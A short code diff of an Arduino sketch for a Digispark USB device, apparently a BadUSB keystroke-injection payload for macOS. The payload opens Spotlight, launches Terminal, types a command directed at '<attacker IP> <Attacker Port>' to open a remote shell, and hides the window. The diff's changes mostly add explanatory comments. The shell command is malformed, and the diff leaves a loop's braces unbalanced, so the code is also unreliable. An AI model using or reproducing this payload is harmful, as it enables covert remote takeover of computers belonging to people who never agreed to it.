@@ -8,9 +8,9 @@ void setup() {
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(200);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); // opens spotlight
   DigiKeyboard.delay(200);
-  DigiKeyboard.print("terminal");
+  DigiKeyboard.print("terminal");                     // types "terminal"
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(200);
@@ -18,9 +18,9 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_7, MOD_ALT_LEFT);
   DigiKeyboard.print("bash /s <attacker IP> <Attacker Port>");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);
+  DigiKeyboard.sendKeyStroke(KEY_H, MOD_GUI_LEFT);  //Closes the window
 
-  for (;;) {
+  for (;;)
     /*Stops the digispark from running the scipt again*/
   }
 }
